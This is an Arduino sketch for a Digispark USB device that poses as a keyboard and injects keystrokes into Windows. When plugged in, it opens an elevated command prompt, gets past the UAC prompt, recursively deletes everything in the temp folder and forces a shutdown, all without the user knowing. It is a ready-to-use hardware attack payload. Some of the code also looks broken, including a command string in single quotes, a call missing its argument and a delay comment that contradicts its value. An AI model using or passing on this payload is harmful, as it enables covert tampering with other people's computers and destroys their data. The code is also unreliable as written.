#include "DigiKeyboard.h"

void setup() {
  
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cd %temp%");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print('for /d %D in (*) do rd /s /q "%D"');
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  
  DigiKeyboard.print("del /f /q *");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  
  DigiKeyboard.print("shutdown /f /s");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
    
  }


void loop() {
  
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(20); //5 seconds delay
  DigiKeyboard.sendKeyStroke();
  
  
  
  
  // Type out this string letter by letter on the computer (assumes US-style
  // keyboard)
  //DigiKeyboard.println("Hello Digispark!");
 
  
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  //DigiKeyboard.delay(5000);
}
